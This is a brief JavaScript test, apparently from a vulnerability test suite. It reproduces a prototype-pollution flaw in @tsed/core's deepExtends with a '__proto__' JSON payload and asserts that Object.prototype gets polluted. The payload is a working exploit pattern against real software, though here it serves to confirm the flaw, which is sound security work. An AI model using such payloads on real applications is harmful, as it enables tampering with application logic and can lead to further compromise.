//https://snyk.io/vuln/SNYK-JS-TSEDCORE-1019382
test("prototype pollution in @tsed/core", () => {
  const { deepExtends } = require("@tsed/core");

  const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');

  let obj = {};

  expect({}.polluted).toBe(undefined);

  let result = deepExtends({ security: [{ 1: "o" }] }, payload);
  expect({}.polluted).toBe("yes");
});
